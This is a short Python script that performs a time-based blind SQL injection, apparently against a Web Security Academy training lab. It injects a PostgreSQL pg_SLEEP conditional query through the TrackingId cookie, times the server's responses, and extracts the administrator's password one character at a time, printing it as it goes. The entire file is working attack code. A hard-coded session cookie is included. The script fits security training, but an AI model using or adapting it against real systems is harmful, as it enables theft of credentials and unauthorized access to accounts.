import requests
headers = {
    "Cookie": "TrackingId=s'%3b+select+case+when(substrING(password,1,1)%3d'a')+then+pg_SLEEP(5)+else+''+end+FROM users where username='administrator'--; session=1YsqZl6wwFBwOBRCSxYSVWtArI1ga9qP",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://0aec009604934177816e179000ce0026.web-security-academy.net/",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}

req = requests.get("https://0aec009604934177816e179000ce0026.web-security-academy.net", headers=headers)

password = ''
characters = [
    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
    "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"
]

while password == '' and len(password) != 20:
    for i in range (1,21):
        for char in characters:
            secret = str(password)+str(char)
            headers["Cookie"] =  f"TrackingId=s'%3b+select+case+when(substrING(password,1,{i})%3d'{secret}')+then+pg_SLEEP(5)+else+''+end+FROM users where username='administrator'--; session=1YsqZl6wwFBwOBRCSxYSVWtArI1ga9qP"
            req = requests.get("https://0aec009604934177816e179000ce0026.web-security-academy.net", headers=headers)
            #print(char + " " + str(i))
            if req.elapsed.total_seconds() >= 5:
                password += char
                print(password)
                break
            

print(password)
